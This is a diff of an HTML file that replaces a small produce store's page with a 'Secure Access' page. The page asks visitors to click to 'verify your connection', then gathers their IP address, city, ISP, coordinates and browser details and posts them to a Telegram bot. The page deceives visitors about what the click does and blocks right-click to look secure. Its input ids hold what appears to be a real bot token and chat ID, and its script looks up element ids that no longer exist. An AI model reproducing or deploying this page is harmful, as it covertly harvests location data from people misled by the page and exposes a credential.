@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blue Acres Store - Premium Products</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Access</title>
     <style>
         * {
             margin: 0;
@@ -12,399 +12,449 @@
         }
 
         body {
-            font-family: 'Arial', sans-serif;
-            line-height: 1.6;
-            color: #333;
-            background-color: #f4f4f4;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
         }
 
-        header {
-            background: linear-gradient(135deg, #2c3e50, #3498db);
-            color: white;
-            padding: 1rem 0;
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        body::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
+            background-size: 20px 20px;
+            opacity: 0.3;
+            pointer-events: none;
         }
 
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+            transform: translateY(0);
+            transition: transform 0.3s ease;
         }
 
-        .header-content {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            font-size: 2rem;
-            font-weight: bold;
-            color: white;
-        }
-
-        nav ul {
-            display: flex;
-            list-style: none;
-        }
-
-        nav ul li {
-            margin-left: 2rem;
-        }
-
-        nav ul li a {
-            color: white;
-            text-decoration: none;
-            transition: color 0.3s;
-        }
-
-        nav ul li a:hover {
-            color: #3498db;
-        }
-
-        .hero {
-            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 600"><rect fill="%233498db" width="1200" height="600"/><text x="50%" y="50%" text-anchor="middle" fill="white" font-size="40">Blue Acres Store</text></svg>');
-            background-size: cover;
-            background-position: center;
-            height: 100vh;
+        .icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            margin: 0 auto 24px;
             display: flex;
             align-items: center;
             justify-content: center;
-            text-align: center;
-            color: white;
-            margin-top: 80px;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
         }
 
-        .hero h1 {
-            font-size: 3rem;
-            margin-bottom: 1rem;
+        .icon svg {
+            width: 40px;
+            height: 40px;
+            fill: white;
         }
 
-        .hero p {
-            font-size: 1.2rem;
-            margin-bottom: 2rem;
+        h1 {
+            color: #1a202c;
+            font-size: 24px;
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+
+        p {
+            color: #718096;
+            font-size: 16px;
+            margin-bottom: 32px;
+            line-height: 1.5;
         }
 
         .btn {
-            display: inline-block;
-            padding: 12px 30px;
-            background: #3498db;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            text-decoration: none;
-            border-radius: 5px;
-            transition: background 0.3s;
+            border: none;
+            padding: 16px 48px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 20px rgba(102, 126, 234, 0.4);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            margin-bottom: 16px;
         }
 
         .btn:hover {
-            background: #2980b9;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(102, 126, 234, 0.5);
         }
 
-        .products {
-            padding: 80px 0;
-            background: white;
+        .btn:active {
+            transform: translateY(0);
         }
 
-        .products h2 {
-            text-align: center;
-            font-size: 2.5rem;
-            margin-bottom: 3rem;
-            color: #2c3e50;
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
         }
 
-        .product-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 2rem;
-            margin-top: 2rem;
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
         }
 
-        .product-card {
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            overflow: hidden;
-            transition: transform 0.3s;
+        .btn:active::after {
+            width: 300px;
+            height: 300px;
         }
 
-        .product-card:hover {
-            transform: translateY(-5px);
-        }
-
-        .product-image {
-            width: 100%;
-            height: 250px;
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-        }
-
-        .product-info {
-            padding: 1.5rem;
-        }
-
-        .product-info h3 {
-            font-size: 1.5rem;
-            margin-bottom: 0.5rem;
-            color: #2c3e50;
-        }
-
-        .product-info p {
-            color: #666;
-            margin-bottom: 1rem;
-        }
-
-        .price {
-            font-size: 1.3rem;
-            font-weight: bold;
-            color: #3498db;
-            margin-bottom: 1rem;
-        }
-
-        .order-btn {
-            width: 100%;
-            padding: 10px;
-            background: #27ae60;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1rem;
-            transition: background 0.3s;
-        }
-
-        .order-btn:hover {
-            background: #229954;
-        }
-
-        .about {
-            padding: 80px 0;
-            background: #f8f9fa;
-            text-align: center;
-        }
-
-        .about h2 {
-            font-size: 2.5rem;
-            margin-bottom: 2rem;
-            color: #2c3e50;
-        }
-
-        .about p {
-            font-size: 1.1rem;
-            max-width: 800px;
-            margin: 0 auto;
-            color: #666;
-        }
-
-        footer {
-            background: #2c3e50;
-            color: white;
-            text-align: center;
-            padding: 2rem 0;
-        }
-
-        .modal {
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
             display: none;
-            position: fixed;
-            z-index: 2000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.5);
+            animation: slideIn 0.3s ease;
         }
 
-        .modal-content {
-            background-color: white;
-            margin: 15% auto;
-            padding: 20px;
-            border: 1px solid #888;
-            width: 80%;
-            max-width: 500px;
-            border-radius: 10px;
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
-        .close {
-            color: #aaa;
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
+        .status.success {
+            background: #c6f6d5;
+            color: #22543d;
+            display: block;
+        }
+
+        .status.error {
+            background: #fed7d7;
+            color: #742a2a;
+            display: block;
+        }
+
+        .status.loading {
+            background: #bee3f8;
+            color: #2a4365;
+            display: block;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .config-section {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e2e8f0;
+            display: none;
+        }
+
+        .config-section.visible {
+            display: block;
+        }
+
+        .config-toggle {
+            color: #667eea;
+            font-size: 14px;
             cursor: pointer;
+            text-decoration: underline;
+            margin-top: 16px;
+            display: inline-block;
         }
 
-        .close:hover {
-            color: black;
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+            font-family: inherit;
         }
 
-        @media (max-width: 768px) {
-            .header-content {
-                flex-direction: column;
-                text-align: center;
-            }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
 
-            nav ul {
-                margin-top: 1rem;
-            }
+        .config-section h3 {
+            font-size: 16px;
+            color: #2d3748;
+            margin-bottom: 16px;
+        }
 
-            nav ul li {
-                margin: 0 1rem;
-            }
+        .info-grid {
+            display: grid;
+            gap: 12px;
+            text-align: left;
+            margin-top: 20px;
+            font-size: 14px;
+        }
 
-            .hero h1 {
-                font-size: 2rem;
-            }
+        .info-item {
+            background: #f7fafc;
+            padding: 12px;
+            border-radius: 8px;
+            border-left: 3px solid #667eea;
+        }
 
-            .product-grid {
-                grid-template-columns: 1fr;
-            }
+        .info-label {
+            color: #718096;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+
+        .info-value {
+            color: #2d3748;
+            font-weight: 600;
+            word-break: break-all;
         }
     </style>
 </head>
 <body>
-    <header>
-        <div class="container">
-            <div class="header-content">
-                <div class="logo">Blue Acres Store</div>
-                <nav>
-                    <ul>
-                        <li><a href="#home">Home</a></li>
-                        <li><a href="#products">Products</a></li>
-                        <li><a href="#about">About</a></li>
-                        <li><a href="#contact">Contact</a></li>
-                    </ul>
-                </nav>
-            </div>
+
+    <div class="container">
+        <div class="icon">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+            </svg>
         </div>
-    </header>
+        
+        <h1>Welcome Back</h1>
+        <p>Click the button below to verify your connection and continue browsing securely.</p>
+        
+        <button class="btn" id="actionBtn" onclick="handleClick()">
+            Click Me
+        </button>
+        
+        <div id="status" class="status"></div>
+        
+        <div id="infoDisplay" class="info-grid" style="display: none;"></div>
 
-    <section id="home" class="hero">
-        <div class="container">
-            <h1>Welcome to Blue Acres Store</h1>
-            <p>Premium Quality Products Direct from Nature</p>
-            <a href="#products" class="btn">Shop Now</a>
-        </div>
-    </section>
-
-    <section id="products" class="products">
-        <div class="container">
-            <h2>Our Products</h2>
-            <div class="product-grid">
-                <div class="product-card">
-                    <div class="product-image" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 250"><rect fill="%23f4e4c1" width="300" height="250"/><ellipse cx="150" cy="125" rx="80" ry="60" fill="%238b4513"/><ellipse cx="150" cy="125" rx="70" ry="50" fill="%23a0522d"/><text x="50%" y="50%" text-anchor="middle" fill="white" font-size="16">Palm Kernel Fruit</text></svg>');"></div>
-                    <div class="product-info">
-                        <h3>Palm Kernel Fruit</h3>
-                        <p>Fresh, organic palm kernel fruits harvested from sustainable farms. Rich in nutrients and perfect for various culinary uses.</p>
-                        <div class="price">$15.99/kg</div>
-                        <button class="order-btn" onclick="openOrderModal('Palm Kernel Fruit')">Order Now</button>
-                    </div>
-                </div>
-
-                <div class="product-card">
-                    <div class="product-image" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 250"><rect fill="%23fff8dc" width="300" height="250"/><path d="M150 50 Q100 100 150 150 Q200 100 150 50" fill="%23ffd700"/><path d="M150 150 Q100 200 150 200 Q200 200 150 150" fill="%23ff8c00"/><text x="50%" y="50%" text-anchor="middle" fill="black" font-size="16">Plantain</text></svg>');"></div>
-                    <div class="product-info">
-                        <h3>Fresh Plantain</h3>
-                        <p>Premium quality plantains, perfect for cooking, frying, or making delicious chips. Grown organically and delivered fresh.</p>
-                        <div class="price">$8.99/kg</div>
-                        <button class="order-btn" onclick="openOrderModal('Fresh Plantain')">Order Now</button>
-                    </div>
-                </div>
-
-                <div class="product-card">
-                    <div class="product-image" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 250"><rect fill="%23faf0e6" width="300" height="250"/><rect x="50" y="100" width="200" height="50" fill="%23daa520" rx="5"/><rect x="60" y="110" width="180" height="30" fill="%23cd853f" rx="3"/><text x="50%" y="50%" text-anchor="middle" fill="white" font-size="16">Plantain Chips</text></svg>');"></div>
-                    <div class="product-info">
-                        <h3>Plantain Chips</h3>
-                        <p>Crispy, delicious plantain chips made from premium plantains. Perfect snack for any time of the day.</p>
-                        <div class="price">$5.99/pack</div>
-                        <button class="order-btn" onclick="openOrderModal('Plantain Chips')">Order Now</button>
-                    </div>
-                </div>
-
-                <div class="product-card">
-                    <div class="product-image" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 250"><rect fill="%23e6e6fa" width="300" height="250"/><rect x="75" y="75" width="150" height="100" fill="%23708090" rx="10"/><rect x="85" y="85" width="130" height="80" fill="%23a9a9a9" rx="5"/><text x="50%" y="50%" text-anchor="middle" fill="white" font-size="14">Asbestos Sheets</text></svg>');"></div>
-                    <div class="product-info">
-                        <h3>Asbestos Sheets</h3>
-                        <p>High-quality asbestos sheets for construction and industrial use. Durable and heat-resistant material.</p>
-                        <div class="price">$45.99/sheet</div>
-                        <button class="order-btn" onclick="openOrderModal('Asbestos Sheets')">Order Now</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <section id="about" class="about">
-        <div class="container">
-            <h2>About Blue Acres Store</h2>
-            <p>Blue Acres Store is your trusted source for premium quality products. We specialize in providing fresh, organic produce and high-quality materials. Our commitment to excellence and customer satisfaction has made us a leading supplier in the region.</p>
-        </div>
-    </section>
-
-    <footer id="contact">
-        <div class="container">
-            <p>&copy; 2024 Blue Acres Store. All rights reserved.</p>
-            <p>Contact us: info@blueacres.com | +1 (555) 123-4567</p>
-        </div>
-    </footer>
-
-    <!-- Order Modal -->
-    <div id="orderModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeOrderModal()">&times;</span>
-            <h2>Place Your Order</h2>
-            <p id="orderProduct"></p>
-            <form>
-                <label for="quantity">Quantity:</label>
-                <input type="number" id="quantity" name="quantity" min="1" value="1" style="width: 100%; padding: 8px; margin: 10px 0;">
-                
-                <label for="name">Your Name:</label>
-                <input type="text" id="name" name="name" style="width: 100%; padding: 8px; margin: 10px 0;">
-                
-                <label for="email">Email:</label>
-                <input type="email" id="email" name="email" style="width: 100%; padding: 8px; margin: 10px 0;">
-                
-                <label for="phone">Phone:</label>
-                <input type="tel" id="phone" name="phone" style="width: 100%; padding: 8px; margin: 10px 0;">
-                
-                <button type="button" onclick="submitOrder()" style="width: 100%; padding: 10px; background: #27ae60; color: white; border: none; border-radius: 5px; cursor: pointer;">Submit Order</button>
-            </form>
+        <span class="config-toggle" onclick="toggleConfig()">⚙️ Configure Telegram Bot</span>
+        
+        <div class="config-section" id="configSection">
+            <h3>Telegram Configuration</h3>
+            <input type="text" id="8521122830:AAFBXnF5E1m6ImzL-UIx1zcFsPBqC8TcdvA" placeholder="Bot Token (from @BotFather)">
+            <input type="text" id="8521122830" placeholder="Chat ID (your user ID)">
+            <button class="btn" style="padding: 10px; font-size: 14px;" onclick="saveConfig()">Save Configuration</button>
         </div>
     </div>
 
     <script>
-        // Smooth scrolling
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                document.querySelector(this.getAttribute('href')).scrollIntoView({
-                    behavior: 'smooth'
-                });
-            });
-        });
+        // Configuration storage
+        let config = {
+            botToken: localStorage.getItem('tg_bot_token') || '',
+            chatId: localStorage.getItem('tg_chat_id') || ''
+        };
 
-        // Order modal functionality
-        function openOrderModal(productName) {
-            document.getElementById('orderModal').style.display = 'block';
-            document.getElementById('orderProduct').textContent = 'Product: ' + productName;
+        // Load saved config
+        if (config.botToken) document.getElementById('botToken').value = config.botToken;
+        if (config.chatId) document.getElementById('chatId').value = config.chatId;
+
+        function toggleConfig() {
+            const section = document.getElementById('configSection');
+            section.classList.toggle('visible');
         }
 
-        function closeOrderModal() {
-            document.getElementById('orderModal').style.display = 'none';
-        }
-
-        function submitOrder() {
-            alert('Thank you for your order! We will contact you soon.');
-            closeOrderModal();
-        }
-
-        // Close modal when clicking outside of it
-        window.onclick = function(event) {
-            if (event.target == document.getElementById('orderModal')) {
-                closeOrderModal();
+        function saveConfig() {
+            const token = document.getElementById('botToken').value.trim();
+            const chatId = document.getElementById('chatId').value.trim();
+            
+            if (token && chatId) {
+                localStorage.setItem('tg_bot_token', token);
+                localStorage.setItem('tg_chat_id', chatId);
+                config = { botToken: token, chatId: chatId };
+                showStatus('Configuration saved successfully!', 'success');
+                setTimeout(() => {
+                    document.getElementById('configSection').classList.remove('visible');
+                }, 1000);
+            } else {
+                showStatus('Please fill in both fields', 'error');
             }
         }
+
+        function showStatus(message, type) {
+            const status = document.getElementById('status');
+            status.className = 'status ' + type;
+            if (type === 'loading') {
+                status.innerHTML = '<span class="spinner"></span>' + message;
+            } else {
+                status.textContent = message;
+            }
+        }
+
+        async function getIPInfo() {
+            try {
+                // Using ipapi.co for comprehensive IP data (free tier available)
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error('Failed to fetch IP');
+                return await response.json();
+            } catch (error) {
+                // Fallback to ipify if ipapi fails
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const { ip } = await ipResponse.json();
+                    return { ip, source: 'ipify' };
+                } catch (fallbackError) {
+                    throw new Error('Could not retrieve IP address');
+                }
+            }
+        }
+
+        async function sendToTelegram(data) {
+            if (!config.botToken || !config.chatId) {
+                throw new Error('Please configure Telegram Bot Token and Chat ID first (click ⚙️ Configure)');
+            }
+
+            const message = `📱 *New Connection Detected*\n\n` +
+                `🌐 *IP Address:* \\${data.ip}\n` +
+                (data.city ? `📍 *Location:* \\${data.city}, \\${data.region}, \\${data.country_name}\n` : '') +
+                (data.org ? `🏢 *ISP:* \\${data.org}\n` : '') +
+                (data.latitude ? `🗺 *Coords:* \\${data.latitude}, \\${data.longitude}\n` : '') +
+                `\n⏰ *Time:* \\${new Date().toLocaleString()}\n` +
+                `📱 *User Agent:* \\${navigator.userAgent}`;
+
+            const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: config.chatId,
+                    text: message,
+                    parse_mode: 'MarkdownV2'
+                })
+            });
+
+            if (!response.ok) {
+                const error = await response.json();
+                throw new Error(error.description || 'Failed to send message');
+            }
+
+            return await response.json();
+        }
+
+        function displayInfo(data) {
+            const display = document.getElementById('infoDisplay');
+            let html = '';
+            
+            const fields = [
+                { label: 'IP Address', value: data.ip },
+                { label: 'City', value: data.city },
+                { label: 'Region', value: data.region },
+                { label: 'Country', value: data.country_name },
+                { label: 'ISP', value: data.org },
+                { label: 'Timezone', value: data.timezone }
+            ];
+
+            fields.forEach(field => {
+                if (field.value) {
+                    html += `
+                        <div class="info-item">
+                            <div class="info-label">${field.label}</div>
+                            <div class="info-value">${field.value}</div>
+                        </div>
+                    `;
+                }
+            });
+
+            display.innerHTML = html;
+            display.style.display = 'grid';
+        }
+
+        async function handleClick() {
+            const btn = document.getElementById('actionBtn');
+            
+            try {
+                // Check config first
+                if (!config.botToken || !config.chatId) {
+                    showStatus('Please configure Telegram settings first (click ⚙️ below)', 'error');
+                    document.getElementById('configSection').classList.add('visible');
+                    return;
+                }
+
+                btn.disabled = true;
+                showStatus('Retrieving network information...', 'loading');
+
+                // Get IP info
+                const ipData = await getIPInfo();
+                
+                showStatus('Sending to Telegram...', 'loading');
+                
+                // Send to Telegram
+                await sendToTelegram(ipData);
+                
+                // Display success
+                showStatus('✓ Verification complete! Data sent to Telegram.', 'success');
+                displayInfo(ipData);
+                
+                btn.textContent = 'Completed';
+                
+            } catch (error) {
+                console.error(error);
+                showStatus('Error: ' + error.message, 'error');
+                btn.disabled = false;
+            }
+        }
+
+        // Prevent right-click to make it look more "secure" (optional)
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+        });
     </script>
+
 </body>
 </html>
